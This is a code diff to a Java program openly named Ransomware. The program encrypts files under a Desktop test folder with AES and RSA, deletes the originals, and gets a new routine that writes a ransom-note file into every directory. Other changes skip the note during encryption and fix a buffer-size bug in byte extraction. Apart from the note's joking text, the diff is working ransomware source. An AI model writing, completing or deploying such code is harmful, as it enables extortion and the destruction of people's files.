@@ -1,8 +1,8 @@
-package ransomware;
-
+import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
@@ -36,6 +36,9 @@ public class Ransomware {
 	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
 	private static final String EXTENSION = ".RANSOM";
 	private static final int PORT_NUM = 2435;
+	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files"
+			+ "	will be decrypted soon, no need to send money :)";
+	private static final String RANSOM_NAME = "RANSOM_INSTRUCTIONS.txt";
 	
 	private static List<String> targetedExtensions = new ArrayList<String>();
 	private static Cipher cipher = null, cipherRSA = null;
@@ -55,7 +58,7 @@ public class Ransomware {
 		
 		// Get a list of files to encrypt
 		List<File> targetedFiles = new ArrayList<File>();
-		getAllFiles(TARGET_DIR, targetedFiles);
+		getAllFiles(TARGET_DIR, targetedFiles, true);
 		
 		// Generate a secure 256 bit symmetric key for AES to use
 		SecretKey key = createKey();
@@ -164,7 +167,7 @@ public class Ransomware {
 		SecretKey symmetricKey = new SecretKeySpec(symmetricKeyBytes, "AES");
 		
 		targetedFiles.clear();
-		getAllFiles(TARGET_DIR, targetedFiles);
+		getAllFiles(TARGET_DIR, targetedFiles, false);
 		
 		decryptFiles(targetedFiles, symmetricKey);
 		deleteEncryptedFiles(targetedFiles);
@@ -185,23 +188,40 @@ public class Ransomware {
 	}
 
 	
-	private static void getAllFiles(String directoryName, List<File> files) {
+	private static void getAllFiles(String directoryName, List<File> files, boolean placeNote) {
 	    File directory = new File(directoryName);
 
+    	if(placeNote) {
+    		placeRansomNote(directory);
+    	}
+    	
 	    File[] fList = directory.listFiles();
 	    if(fList != null) {
 	        for (File file : fList) {      
 	            if (file.isFile()) {
 	                files.add(file);
 	            } else if (file.isDirectory()) {
-	            	//TODO: Add ransom note to each directory
-	            	getAllFiles(file.getAbsolutePath(), files);
+	            	getAllFiles(file.getAbsolutePath(), files, placeNote);
 	            }
 	        }
 	    }
 	}
 	
 	
+	private static void placeRansomNote(File dir) {
+		String loc = dir.getAbsolutePath();
+		System.out.println("Creating ransom note: " + loc + "\\" + RANSOM_NAME);
+		File ransomFile = new File(loc + "\\" + RANSOM_NAME);
+		try {
+			BufferedWriter output = new BufferedWriter(new FileWriter(ransomFile));
+			output.write(RANSOM_TEXT);
+			output.close();
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+
+
 	private static SecretKey createKey() {
 		SecretKey key = null;
 		try {
@@ -230,7 +250,8 @@ public class Ransomware {
 			* in the allowed list.
 			*/
 			String extension = getFileExtension(file.getName());
-			if(!targetedExtensions.contains(extension)) {
+			if(!targetedExtensions.contains(extension) || 
+					file.getName().equals(RANSOM_NAME)) {
 				continue;
 			}
 			
@@ -268,7 +289,8 @@ public class Ransomware {
 	private static void deleteOriginals(List<File> results) {
 		for(File file: results) {
 			String extension = getFileExtension(file.getName());
-			if(targetedExtensions.contains(extension)) {
+			if(targetedExtensions.contains(extension) &&
+					!file.getName().equals(RANSOM_NAME)) {
 				file.delete();
 			}
 		}
@@ -362,7 +384,7 @@ public class Ransomware {
 
 
 	private static byte[] extractBytes(byte[] fileData, int start, int end) {
-		byte[] bytesArray = new byte[IV_LENGTH];
+		byte[] bytesArray = new byte[end - start];
 		int indexCounter = 0;
 		for(int i = start; i < end; i++) {
 			bytesArray[indexCounter] = fileData[i];
